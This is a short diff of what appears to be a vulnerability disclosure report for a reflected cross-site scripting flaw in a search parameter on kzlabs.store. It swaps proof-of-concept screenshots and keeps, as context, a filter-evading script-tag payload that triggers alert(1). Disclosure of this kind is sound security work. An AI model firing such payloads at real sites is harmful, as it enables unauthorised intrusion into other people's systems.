@@ -19,10 +19,9 @@ https://kzlabs.store/subdomains/kb/?search=
 `cyberbro'"<><sCrIpT>a\u006cert(1)</sCrIpT>`
 
 # Proof of Concept
-<img width="1920" height="1040" alt="37" src="https://github.com/user-attachments/assets/9331c497-74e0-4e2a-a82d-2f8019ec2c75" />
+<img width="1920" height="1040" alt="35" src="https://github.com/user-attachments/assets/66ee6111-fe77-4410-b922-c11dc4f18974" />
 
-<img width="1920" height="1039" alt="38" src="https://github.com/user-attachments/assets/f8ebf865-385c-47fe-bb44-b13850600d1d" />
-
+<img width="1920" height="1036" alt="36" src="https://github.com/user-attachments/assets/61dc9a15-c358-4cbe-a825-4ccb6aba75d8" />
 
 # Impact
 An attacker can perform the following actions using this vulnerability:
